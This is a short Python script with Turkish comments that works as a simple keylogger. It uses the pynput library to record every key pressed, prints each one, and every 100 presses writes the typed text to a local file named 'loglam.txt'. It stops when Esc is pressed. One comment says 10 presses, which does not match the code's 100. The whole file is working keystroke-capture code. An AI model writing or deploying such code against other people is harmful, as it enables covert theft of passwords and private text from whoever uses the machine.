import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

#bas modu
def bas(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} tuşuna basıldı".format(key))

    #10 basışta
    if count >= 100:
        count = 0
        dosyaya_yaz(keys)
        keys=[]

#Dosyaya yazmacalı
def dosyaya_yaz(keys):
    with open("loglam.txt", "w") as f:   #"w" yeni dosya oluşturur, "a" varolan dosyaya yazar
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

#kal modu
def kal(key):
    if key == Key.esc:
        return False

with Listener(on_press=bas, on_release=kal) as listener:
    listener.join()